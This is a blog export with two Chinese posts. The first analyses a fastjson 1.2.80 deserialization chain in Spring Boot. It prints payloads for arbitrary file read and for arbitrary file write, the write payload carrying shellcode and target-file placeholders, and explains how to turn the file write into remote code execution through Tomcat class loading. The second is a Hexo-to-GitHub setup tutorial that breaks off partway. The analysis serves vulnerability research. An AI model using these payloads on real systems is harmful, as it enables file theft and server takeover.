<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>fastjson1.2.80 in Springtboot新链学习</title>
      <link href="/2024/12/06/fastjson1.2.80%20in%20Springtboot%E6%96%B0%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/12/06/fastjson1.2.80%20in%20Springtboot%E6%96%B0%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf">https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf</a></p><p><a href="http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/">http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/</a></p><p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">GitHub - luelueking&#x2F;CVE-2022-25845-In-Spring: CVE-2022-25845(fastjson1.2.80) exploit in Spring Env!</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 <code>JSON.parse</code> 或 <code>JSON.parseObject</code> 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p><p><img src="https://s2.loli.net/2024/12/06/XhsNtREHD1KzVrp.webp"></p><p>在之前的研究中针对fj1.2.80已经有了三种常见的利用场景</p><p><a href="https://github.com/su18/hack-fastjson-1.2.80">GitHub - su18&#x2F;hack-fastjson-1.2.80</a></p><p><img src="https://s2.loli.net/2024/12/06/9lZtiaXscv7uyNq.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>需要的依赖</p><ul><li>jackson</li><li>commons-io</li></ul><p>思路</p><ol><li>将InputStream放入fastjson缓存</li><li>读取&#x2F;tmp文件下的文件，找到docbase的文件名。</li><li>往${docbase}&#x2F;WEB-INF&#x2F;classes&#x2F;路径下写入恶意类</li><li>通过fastjson触发类加载</li></ol><p><a href="https://github.com/ph0ebus/CVE-2022-25845-In-Spring">GitHub - ph0ebus&#x2F;CVE-2022-25845-In-Spring: exploit by python</a></p><p><img src="https://s2.loli.net/2024/12/06/1rDm25MnRZhdtNz.gif"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h2><p>这个新链子也是利用缓存机制</p><p><img src="https://s2.loli.net/2024/12/06/gM8i1WPFYkQfujG.png"></p><p><strong>fastjson反序列化符合条件的期望类时，会将setter参数、public字段、构造函数参数加到缓存中。</strong></p><p><img src="https://s2.loli.net/2024/12/06/TQzRw5kqKnNpM3W.png"></p><p>先分析一下添加缓存的过程，以下面payload为例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.fasterxml.jackson.core.exc.InputCoercionException&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/xHlC1AW4XiUVdzR.png"></p><p>在<code>TypeUtils.getClassFromMapping()</code>尝试从缓存中获取<code>java.lang.Exception</code>类</p><p><img src="https://s2.loli.net/2024/12/06/Hr6cygsBOCUnwM5.png"></p><p>在<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>初始化中默认添加了一些作为缓存了的类，其中就包含<code>Exception.class</code></p><p><img src="https://s2.loli.net/2024/12/06/nd2oNlJqp6Ajze8.png"></p><p>可以看到有95个缓存过的类</p><p><img src="https://s2.loli.net/2024/12/06/yxBqvgV1sp7TGOS.png"></p><p>从缓存中获取class后返回，然后继续恢复其字段信息</p><p><code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer</code>先通过获取到的class获取对应的反序列化器</p><p><img src="https://s2.loli.net/2024/12/06/T2lByerNkM6cW8Y.png"></p><p><img src="https://s2.loli.net/2024/12/06/cNfk6zqw3dyLC9i.png"></p><p>可以跟踪到这行关键代码</p><p><img src="https://s2.loli.net/2024/12/06/GjHWun9D54dt6PI.png"></p><p>根据异常处理类的继承关系可以发现，<code>java.lang.Exception</code>类符合这个判断条件，于是反序列化器被设置为<code>ThrowableDeserializer</code></p><p><img src="https://s2.loli.net/2024/12/06/XHfsk8andpSK3Ur.png"></p><p>在<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>反序列化过程中会将Exception作为期望类</p><p><img src="https://s2.loli.net/2024/12/06/dknOhKfNLwu3WQA.png"></p><p>然后解析json中的键值对，这里key是<code>@type</code></p><p><img src="https://s2.loli.net/2024/12/06/9Ny6nYQgdVkTKeb.png"></p><p>当key为<code>@type</code>时会将<code>Throwable.class</code>作为期望类传入<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType()</code></p><p><img src="https://s2.loli.net/2024/12/06/wXdqfV7c92KbDRl.png"></p><p><img src="https://s2.loli.net/2024/12/06/vwoXLx7cret2W9K.png"></p><p>需要经过黑名单过滤和白名单校验</p><p><img src="https://s2.loli.net/2024/12/06/TkJ2c3BC8besmRL.png"></p><p>继续跟进到这段代码，根据传入的Typename来加载类，加载后，如果是期望类的子类则加入到缓存mapping中</p><p><img src="https://s2.loli.net/2024/12/06/oHIThNAP8EXvugj.png"></p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>进一步分析一下任意读的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;    \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a.a&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonParser\&quot;,  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&quot;,  \&quot;in\&quot;: &#123;&#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.c.c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>利用循环引用尝试将字符串转换为对象并获取对象的值，按作者的话来说，这里是利用JsonPath来忽略本有的异常</p><p>接着上面继续分析，恢复好<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>后，继续利用<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>获取字段，根据key实例化出<code>FieldDeserializer</code>进一步处理</p><p><img src="https://s2.loli.net/2024/12/06/1mtdVkABFxUzuPE.png"></p><p>继续，调用<code>TypeUtils#cast</code>进行类型转换</p><p><img src="https://s2.loli.net/2024/12/06/2AmVsTXkhPcIag5.png"></p><p><code>com.alibaba.fastjson.util.TypeUtils#cast(java.lang.Object, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>会根据传入的obj进行相应的类型转换，这里会进入<code>Map</code>类型这个分支</p><p><img src="https://s2.loli.net/2024/12/06/1bdjB2WZv9KYMue.png"></p><p>跟进到<code>com.alibaba.fastjson.util.TypeUtils#castToJavaBean(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>，根据构造方法参数类型clazz获取反序列化器，clazz为<code>com.fasterxml.jackson.core.JsonParser</code></p><p><img src="https://s2.loli.net/2024/12/06/EsxcvjRPyHqXbmd.png"></p><p>获取到反序列化器后，调用<code>putDeserializer</code>函数<code>this.deserializers.put(type, deserializer)</code></p><p><img src="https://s2.loli.net/2024/12/06/869YZ2PbcfTDQxn.png"></p><p>这里就会将<code>type</code>和<code>deserializer</code>存入<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>中</p><p><img src="https://s2.loli.net/2024/12/06/wf7eKacL3WOUbvq.png"></p><p>在后续恢复<code>com.fasterxml.jackson.core.JsonParser</code>中，调用<code>this.deserializers.findClass(typeName)</code>就可以从<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>中获取到这个类</p><p><img src="https://s2.loli.net/2024/12/06/28W3JEz6vQjDeAI.png"></p><p><img src="https://s2.loli.net/2024/12/06/C7JuiNVTBd5RDxr.png"></p><p>而<code>com.fasterxml.jackson.core.json.UTF8StreamJsonParser</code>是<code>com.fasterxml.jackson.core.JsonParser</code>的子类，类似前面利用<code>java.lang.Exception</code>恢复<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>一样</p><p><img src="https://s2.loli.net/2024/12/06/YW4jfn9QCVzU6qH.png"></p><p>因为实现JsonParser的类中只有<code>UTF8StreamJsonParser</code>的构造参数存在<code>InputStream</code>，因此可以进一步获取到<code>InputStream</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UTF8StreamJsonParser</span><span class="params">(IOContext ctxt, <span class="type">int</span> features, InputStream in, ObjectCodec codec, ByteQuadsCanonicalizer sym, <span class="type">byte</span>[] inputBuffer, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> bytesPreProcessed, <span class="type">boolean</span> bufferRecyclable)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(ctxt, features);</span><br><span class="line">    <span class="built_in">this</span>._quadBuffer = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">this</span>._inputStream = in;</span><br><span class="line">    <span class="built_in">this</span>._objectCodec = codec;</span><br><span class="line">    <span class="built_in">this</span>._symbols = sym;</span><br><span class="line">    <span class="built_in">this</span>._inputBuffer = inputBuffer;</span><br><span class="line">    <span class="built_in">this</span>._inputPtr = start;</span><br><span class="line">    <span class="built_in">this</span>._inputEnd = end;</span><br><span class="line">    <span class="built_in">this</span>._currInputRowStart = start - bytesPreProcessed;</span><br><span class="line">    <span class="built_in">this</span>._currInputProcessed = (<span class="type">long</span>)(-start + bytesPreProcessed);</span><br><span class="line">    <span class="built_in">this</span>._bufferRecyclable = bufferRecyclable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/HR4eImwvabdiuNn.png"></p><p>而获取<code>InputStream</code>就是为了实现任意文件读</p><p><a href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">fastjson 读文件 gadget 的利用场景扩展</a></p><p>原blackhat usa 21的议题ppt</p><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p><p>这里就是通过<code>org.apache.commons.io.input.BOMInputStream</code>来逐字节盲读取文件</p><p><img src="https://s2.loli.net/2024/12/06/IvcKEtwdb4z8B5r.png"></p><p>在<code>org.apache.commons.io.input.BOMInputStream#getBOM</code>中会调用<code>org.apache.commons.io.input.BOMInputStream#find</code>方法</p><p><img src="https://s2.loli.net/2024/12/06/cYSRWoUDg19bJaq.png"></p><p>跟进find方法可以发现，这里先把 delegate 输入流的字节码转成 int 数组，然后拿 <code>ByteOrderMark</code>里的 bytes 挨个字节遍历去比对，如果遍历过程有比对错误的，<code>getBom</code>方法 就会返回<code>null</code>，如果遍历结束，没有比对错误那就会返回一个<code>ByteOrderMark</code>对象</p><p><img src="https://s2.loli.net/2024/12/06/YvrIkgVilx2AhZ4.png"></p><p>因此逐字节盲读取的关键差异点就在这里</p><p>最后输入流来源来自于<code>jdk.nashorn.api.scripting.URLReader</code>，<code>public URLReader(URL url)</code>可以传入一个 URL 对象。这就意味着 file jar http 等协议都可以使用。这里传入了file协议用于列举目录</p><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>然后分析一下任意文件写的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.AutoCloseInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">          <span class="string">&quot;$&#123;shellcode&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> $<span class="punctuation">&#123;</span>size<span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.LockableFileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file2write&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里和blackhat的议题提到的也有很多共通之处，都是利用<code>org.apache.commons.io.input.TeeInputStream#read()</code>方法来写入数据</p><p><img src="https://s2.loli.net/2024/12/06/PyQw8an1jANZiKD.png"></p><p>其中的一些细节可以参考</p><p><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析</a></p><p>但是这里作者似乎找到了一个更好的链子规避blackhat议题中原Poc链子中存在的写入缓冲区的8192字节限制</p><p><img src="https://s2.loli.net/2024/12/06/vybF63gZr5WcBtK.png"></p><p><img src="https://s2.loli.net/2024/12/06/i385Ns6QWzLGV7d.png"></p><h2 id="write2RCE"><a href="#write2RCE" class="headerlink" title="write2RCE"></a>write2RCE</h2><p>然后需要讨论的就是如何在任意文件写入的情况下RCE</p><p><a href="https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/">https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/</a></p><p><a href="https://landgrey.me/blog/22/">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a></p><p>常见的做法比如覆盖charsets.jar就是利用jvm的懒加载，覆盖<font style="color:rgb(74, 81, 83);">JDK HOME 目录下原有的 jar中</font>未被加载的charsets.jar包。但这个做法需要事先知道 JDK HOME 的目录路径，并且需要root权限。而且需要针对目标服务jdk版本准备恶意charsets.jar文件，否则可能影响正常服务；又比如利用类加载，在jdk home目录下向classes目录写入恶意class文件，然后利用fastjson的<code>@type</code>触发类加载即可RCE</p><p>这里作者也是利用了类加载，不过这里换了一个新的类加载口子</p><p>在fastjson反序列化过程中，针对不在黑白名单，并且缓存中没有的类会通过<code>com.alibaba.fastjson.util.TypeUtils#loadClass()</code>尝试加载类，其中会通过通过<code>TomcatEmbeddedWebappClassLoader</code>类加载器加载类</p><p><img src="https://s2.loli.net/2024/12/06/yjiV3t7FDRwpx9z.png"></p><p>根据双亲委派机制会委派<code>WebappClassLoaderBase</code>来加载，一路跟下去可以发现在<code>org.apache.catalina.loader.WebappClassLoaderBase#findClass</code>中会调用<code>org.apache.catalina.loader.WebappClassLoaderBase#findClassInternal</code>方法来寻找内部类</p><p><img src="https://s2.loli.net/2024/12/06/Kw93dtihj1lrUbz.png"></p><p>跟进<code>findClassInternal</code></p><p><img src="https://s2.loli.net/2024/12/06/op6Bkv4KFyXPWdH.png"></p><p>进一步跟进<code>org.apache.catalina.webresources.StandardRoot#getClassLoaderResource</code>跟踪类加载路径</p><p><img src="https://s2.loli.net/2024/12/06/6NYIJHn8te5VU1m.png"></p><p><img src="https://s2.loli.net/2024/12/06/4dE2QITebDiFmA1.png"></p><p>这里会判断<code>isCachingAllowed()</code>，而属性<code>cachingAllowed</code>默认为true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCachingAllowed</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.cachingAllowed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/pFwBZAL3VOdE42m.png"></p><p>所以进到<code>org.apache.catalina.webresources.Cache#getResource</code>方法</p><p><img src="https://s2.loli.net/2024/12/06/Ql8PvtHAC26RWFT.png"></p><p>首先调用noCache方法，很明显这里会返回true，从而调用到<code>this.root.getResourceInternal(path, useClassLoaderResources)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">noCache</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> path.endsWith(<span class="string">&quot;.class&quot;</span>) &amp;&amp; (path.startsWith(<span class="string">&quot;/WEB-INF/classes/&quot;</span>) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>)) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>) &amp;&amp; path.endsWith(<span class="string">&quot;.jar&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>org.apache.catalina.webresources.StandardRoot#getResourceInternal</code></p><p><img src="https://s2.loli.net/2024/12/06/UIC9luhJn8txDev.png"></p><p>就可以发现这个类加载路径</p><p><img src="https://s2.loli.net/2024/12/06/n31oU8SBHftCmLJ.png"></p><p>如果这个class文件存在就会正常返回该文件资源，然后恶意类加载达到RCE</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好复杂好复杂，结合三篇议题ppt才能微懂</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客部署到github</title>
      <link href="/2024/11/21/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0github/"/>
      <url>/2024/11/21/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0github/</url>
      
        <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p><a href="https://git-scm.com/">Git</a></p><h2 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h2><p>可以直接上<a href="https://nodejs.org/zh-cn/download/prebuilt-installer">https://nodejs.org/zh-cn/download/prebuilt-installer</a></p><p>有多版本需求的也可以用nvm管理多个版本的nodejs</p><p><a href="https://www.yuque.com/ph0ebus/security/rupe9swqdeftppqg">nvm管理多版本nodejs环境</a></p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装好后执行<code>hexo -version</code></p><p><img src="https://s2.loli.net/2024/11/21/aZ1CzvRIoMNQUBs.png"></p><h1 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>找一个喜欢的目录用于存放博客</p><p><img src="https://s2.loli.net/2024/11/21/qHdmIwioMxsnE37.png"></p><p>然后在当前目录下执行命令，这里hexo初始化一个默认模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init [blog_name]</span><br><span class="line">cd [blog_name]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/2Z3NSGQHJOx8LCm.png"></p><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean # 清除缓存文件，建议写完文章后执行一次</span><br><span class="line">hexo g# 生成 public 文件夹，写完文章执行</span><br><span class="line">hexo s# 启动 hexo 服务</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/bEJweLdkxivOto7.png"></p><p>然后访问<a href="http://localhost:4000/%E5%8D%B3%E5%8F%AF">http://localhost:4000/即可</a></p><p><img src="https://s2.loli.net/2024/11/21/SDQkAlrRm5wNK1J.png"></p><p>看到这个说明就部署成功了</p><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p><a href="https://hexo.io/themes/">Themes</a></p><p>这是官网的主题链接，目前有400+的主题，选择一个自己喜欢的主题</p><p>以 <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack">https://github.com/Ares-X/hexo-theme-freemind.bithack</a> 这个主题为例</p><p><img src="https://s2.loli.net/2024/11/21/EcbUZPK8nqGhuwj.png"></p><p>在 Readme 文档中往往写有如何使用的教程</p><p>主要是几个步骤</p><p>将主题下载到themes目录</p><p><img src="https://s2.loli.net/2024/11/21/KuoQB9fhieLUPjG.png"></p><p>安装环境运行的额外依赖包</p><p><img src="https://s2.loli.net/2024/11/21/Z3SPfEYb9oJNMer.png"></p><p>然后修改配置文件，启用该主题</p><p>复制主题的<code>_config.yml</code>到博客根目录下，改名为<code>_config.[theme_name].yml</code></p><p><img src="https://s2.loli.net/2024/11/21/URfyNk4uWJHMPE9.png"></p><p><img src="https://s2.loli.net/2024/11/21/ABb9nHRNZWymr8s.png"></p><p>然后给hexo根目录下的<code>_config.yml</code>文件中 theme 选项改为要换成的主题</p><p><img src="https://s2.loli.net/2024/11/21/FRdXAvCfIun9rTy.png"></p><p>然后根据主题修改配置文件<code>_config.[theme_name].yml</code>的内容进行个性化配置</p><p><a 